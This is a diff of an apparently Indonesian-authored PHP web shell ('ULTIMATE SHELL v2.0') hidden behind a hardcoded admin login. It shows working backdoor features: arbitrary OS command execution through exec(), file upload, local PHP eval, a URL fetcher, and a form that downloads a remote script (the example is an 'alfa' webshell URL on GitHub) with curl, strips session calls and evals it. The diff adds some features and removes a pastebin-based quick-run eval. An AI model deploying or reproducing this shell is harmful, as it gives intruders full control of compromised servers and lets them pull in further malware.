@@ -1,9 +1,11 @@
 <?php
-// --- Konfigurasi password (bisa diubah)
+// --- Konfigurasi password
 $LOGIN_USERNAME = 'admin';
 $LOGIN_PASSWORD = 'secretpass';
 
-session_start();
+if (session_status() == PHP_SESSION_NONE) {
+    session_start();
+}
 
 function requireLogin() {
     global $LOGIN_USERNAME, $LOGIN_PASSWORD;
@@ -31,7 +33,6 @@ function requireLogin() {
                 input[type="text"], input[type="password"] { width: 100%; padding: 8px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
                 button { width: 100%; padding: 9px; background: #2c3e50; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 0.95em; }
                 button:hover { background: #1a2530; }
-                .note { font-size: 0.8em; color: #888; margin-top: 10px; text-align: center; }
             </style>
         </head>
         <body>
@@ -42,7 +43,7 @@ function requireLogin() {
                 <input type="password" name="login_pass" placeholder="Key" required>
                 <button type="submit">Continue</button>
             </form>
-            <p class="note">Only authorized users can continue.</p>
+            <p style="font-size: 0.8em; color: #888; margin-top: 10px; text-align: center;">Only authorized users</p>
         </div>
         </body>
         </html>
@@ -52,11 +53,11 @@ function requireLogin() {
 }
 requireLogin();
 
-ini_set('display_errors', 0); // ❌ Disable semua error
+ini_set('display_errors', 0);
 error_reporting(0);
 
-echo "<h2>🔥 ULTIMATE SHELL - NO ERRORS</h2>";
-echo "<p style='color: #666;'>Login: <b>admin</b> / <b>secretpass</b></p>";
+echo "<h2>🔥 ULTIMATE SHELL v2.0</h2>";
+echo "<p style='color: #666;'>Login: <b>admin</b> / <b>secretpass</b> | Session OK</p>";
 ?>
 
 <style>
@@ -64,11 +65,12 @@ form { margin: 20px 0; padding: 15px; background: #f8f9fa; border-radius: 8px; b
 label { font-weight: bold; display: block; margin-bottom: 8px; }
 input[type="text"], input[type="file"], textarea { width: 100%; max-width: 600px; padding: 10px; border: 1px solid #ddd; border-radius: 4px; }
 textarea { height: 100px; font-family: monospace; }
-button { padding: 10px 20px; background: #007cba; color: white; border: none; border-radius: 4px; cursor: pointer; }
+button { padding: 10px 20px; background: #007cba; color: white; border: none; border-radius: 4px; cursor: pointer; margin: 2px; }
 button.green { background: #28a745; }
 button.orange { background: #fd7e14; }
 .result-box { background: #f0f8ff; padding: 15px; border-radius: 6px; margin: 10px 0; border-left: 4px solid #007cba; }
 pre { background: #2d3748; color: #e2e8f0; padding: 12px; border-radius: 4px; margin: 8px 0; font-family: monospace; white-space: pre-wrap; max-height: 400px; overflow: auto; }
+.success { border-left-color: #28a745 !important; background: #d4edda !important; }
 </style>
 
 <h3>🛠 Functions:</h3>
@@ -76,8 +78,8 @@ pre { background: #2d3748; color: #e2e8f0; padding: 12px; border-radius: 4px; ma
 <!-- SYSTEM COMMAND -->
 <form method="post">
     <label>💻 System Command:</label>
-    <input type="text" name="cmd" placeholder="whoami, ls -la">
-    <button type="submit">Run</button>
+    <input type="text" name="cmd" placeholder="whoami, ls -la, uname -a">
+    <button type="submit">▶️ Run</button>
 </form>
 <?php
 if (!empty($_POST['cmd'])) {
@@ -86,6 +88,7 @@ if (!empty($_POST['cmd'])) {
     exec($_POST['cmd'], $output, $retval);
     echo "<pre>";
     echo htmlspecialchars(implode("\n", $output));
+    echo "\n\n[Return: $retval]";
     echo "</pre>";
     echo "</div>";
 }
@@ -93,25 +96,40 @@ if (!empty($_POST['cmd'])) {
 
 <!-- UPLOAD -->
 <form method="post" enctype="multipart/form-data">
-    <label>📁 Upload:</label>
+    <label>📁 Upload File:</label>
     <input type="file" name="file">
-    <button type="submit">Upload</button>
+    <button type="submit">⬆️ Upload</button>
 </form>
 <?php
 if (!empty($_FILES['file']['tmp_name'])) {
     $filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $_FILES['file']['name']);
     $dest = __DIR__ . '/' . $filename;
     if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
-        echo "<div class='result-box'>✅ UPLOADED: <a href='$filename' target='_blank'>$filename</a></div>";
+        echo "<div class='result-box success'>✅ UPLOADED: <a href='$filename' target='_blank'>$filename</a></div>";
     }
+}
+?>
+
+<!-- FETCH URL -->
+<form method="post">
+    <label>🌐 Fetch URL:</label>
+    <input type="text" name="url" placeholder="https://example.com">
+    <button type="submit">📥 Get</button>
+</form>
+<?php
+if (!empty($_POST['url'])) {
+    $result = @file_get_contents($_POST['url']);
+    echo "<div class='result-box'>";
+    echo "<pre>" . htmlspecialchars(substr($result ?: 'Failed', 0, 5000)) . "</pre>";
+    echo "</div>";
 }
 ?>
 
 <!-- LOCAL EVAL -->
 <form method="post">
     <label>⚙️ Local PHP:</label>
-    <textarea name="code" placeholder="echo 'test'; phpinfo();">echo 'Local OK';</textarea>
-    <button type="submit">Eval Local</button>
+    <textarea name="code" placeholder="echo 'test'; phpinfo();">echo 'Local working!';</textarea>
+    <button type="submit">▶️ Local Eval</button>
 </form>
 <?php
 if (!empty($_POST['code'])) {
@@ -123,11 +141,11 @@ if (!empty($_POST['code'])) {
 }
 ?>
 
-<!-- REMOTE EXEC (ULTIMATE FIX) -->
+<!-- REMOTE EXEC (SESSION SAFE) -->
 <form method="post">
-    <label>🚀 Remote Script:</label>
+    <label>🚀 Remote Script URL:</label>
     <input type="text" name="remote_url" placeholder="https://raw.githubusercontent.com/sk26889/Webshell/refs/heads/main/alfa.txt" value="">
-    <button class="green" type="submit">EXECUTE 🔥</button>
+    <button class="green" type="submit">🔥 EXECUTE REMOTE</button>
 </form>
 <?php
 if (!empty($_POST['remote_url'])) {
@@ -148,52 +166,35 @@ if (!empty($_POST['remote_url'])) {
     curl_close($ch);
     
     if ($err || empty($code)) {
-        echo "<pre>❌ ERROR: $err</pre>";
+        echo "<pre style='color:red;'>❌ ERROR: $err</pre>";
     } else {
-        // **ULTIMATE SESSION KILLER**
-        $code = preg_replace('/<\?php\s+session_start\s*\(\s*\)\s*;?/i', '<?php //session fixed', $code);
-        $code = preg_replace('/session_start\s*\(\s*\)\s*;?/i', '//session_start() removed', $code);
+        // **SESSION CONFLICT FIX - NO session_write_close()**
+        $code = preg_replace('/<\?php\s+session_start\s*\(\s*\)\s*;?/i', '<?php ', $code);
+        $code = preg_replace('/session_start\s*\(\s*\)\s*;?/i', '', $code);
         
-        // Suppress ALL errors
+        echo "<details><summary>Code Preview (" . strlen($code) . " bytes)</summary>";
+        echo "<pre style='font-size:11px;max-height:200px;overflow:auto;'>" . htmlspecialchars(substr($code, 0, 4000)) . "</pre>";
+        echo "</details>";
+        
         ob_start();
-        
-        // **NUKE SESSION BEFORE EVAL**
-        if (function_exists('session_status') && session_status() === PHP_SESSION_ACTIVE) {
-            @session_write_close();
-        }
-        
-        // **DIRECT EVAL - NO PHP TAG**
-        @eval('?>' . $code);
-        
+        @eval('?>' . $code);  // **NO SESSION CLOSE - SAFE**
         $output = ob_get_clean();
-        echo "<pre style='background:#1a202c;color:#a0aec0;'>" . htmlspecialchars($output) . "</pre>";
+        
+        echo "<h4>▶️ RESULT:</h4>";
+        echo "<pre style='background:#1a202c;color:#90ee90;padding:15px;'>" . htmlspecialchars($output) . "</pre>";
     }
     echo "</div>";
 }
 ?>
 
-<!-- QUICK MODE -->
-<form method="post">
-    <label>⚡ Quick URL:</label>
-    <input type="text" name="quick_url" placeholder="pastebin url">
-    <button class="orange" type="submit">Quick Run</button>
-</form>
-<?php
-if (!empty($_POST['quick_url'])) {
-    $_SESSION['URL'] = $_POST['quick_url'];
-    $_SESSION['go'] = 1;
-    
-    $ch = curl_init($_SESSION['URL']);
-    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>1, CURLOPT_FOLLOWLOCATION=>1, CURLOPT_SSL_VERIFYPEER=>0, CURLOPT_TIMEOUT=>20]);
-    $code = curl_exec($ch);
-    curl_close($ch);
-    
-    if ($code) {
-        $code = preg_replace('/session_start\s*\(.*\);?/i', '', $code);
-        ob_start();
-        @session_write_close();
-        @eval('?>' . $code);
-        echo "<div class='result-box'><pre>" . htmlspecialchars(ob_get_clean()) . "</pre></div>";
-    }
-}
-?>
+<!-- STATUS -->
+<div style="background:#e8f5e8;padding:10px;border-radius:6px;margin:20px 0;">
+    <b>✅ Session Status:</b> <?php echo isset($_SESSION['logged_in']) ? 'ACTIVE' : 'NO SESSION'; ?>
+</div>
+
+<script>
+// Auto refresh status setiap 5 detik
+setInterval(function() {
+    location.reload();
+}, 5000);
+</script>
